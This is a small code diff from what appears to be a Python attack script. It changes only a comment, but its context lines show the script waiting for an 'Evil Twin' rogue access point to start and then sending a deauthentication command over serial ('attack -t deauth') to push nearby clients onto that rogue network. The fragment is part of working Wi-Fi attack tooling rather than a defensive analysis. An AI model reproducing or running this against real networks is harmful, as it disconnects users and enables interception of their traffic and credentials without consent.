@@ -117,7 +117,7 @@ def main():
         # Give the Evil Twin 5 seconds to fully initialize
         time.sleep(5)
 
-        # 6. FINAL DEAUTH: Kick everyone so they move to the Evil Twin
+        # FINAL DEAUTH: Kick everyone so they move to the Evil Twin
         print(f"[!!!] Sending final deauth to push clients to Evil Twin...")
         ser.write(b"attack -t deauth\r\n")
         
